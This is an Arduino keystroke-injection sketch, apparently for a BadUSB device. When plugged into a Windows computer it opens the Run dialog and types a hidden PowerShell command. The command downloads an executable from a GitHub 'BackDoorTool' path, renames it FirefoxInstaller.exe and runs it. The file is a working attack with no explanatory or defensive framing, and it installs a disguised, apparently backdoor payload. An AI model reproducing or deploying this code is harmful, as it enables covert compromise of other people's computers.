#include<Keyboard.h>
void setup() {
  delay(2000);
  type(KEY_LEFT_GUI,false);
  type('d',false);
  Keyboard.releaseAll();
  delay(500);
  
  type(KEY_LEFT_GUI,false);
  type('r',false);
  Keyboard.releaseAll();
  delay(500);
  
  type(KEY_LEFT_CTRL,false);
  type(KEY_SPACE,false);
  Keyboard.releaseAll();
  delay(1000);
  
  type(KEY_LEFT_CTRL,false);
  type('a',false);
  Keyboard.releaseAll();
  delay(500);
  
  type(KEY_BACKSPACE,false);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.print("powershell -windowstyle hidden Invoke-WebRequest https://raw.githubusercontent.com/Hung-Jia-Jun/python/master/BackDoorTool/server.exe -OutFile FirefoxInstaller.exe; Start-Process FirefoxInstaller.exe");
  delay(1000);
  
  type(KEY_RETURN,false);
  Keyboard.releaseAll();
  Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop(){}